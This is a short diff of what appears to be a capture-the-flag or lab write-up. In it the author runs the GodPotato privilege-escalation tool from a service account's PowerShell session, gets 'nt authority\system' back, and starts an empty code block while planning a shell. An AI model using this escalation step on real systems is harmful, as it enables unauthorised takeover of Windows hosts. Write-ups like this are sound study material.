@@ -577,4 +577,8 @@ PS C:\Users\sqlsvc\Documents> ./godpotato.exe -cmd 'cmd /c whoami'
 [*] process start with pid 2008
 nt authority\system
 ```
-I am now nt authority system but ill try 
+I am now nt authority system but ill try to get a shell
+
+```python
+
+```
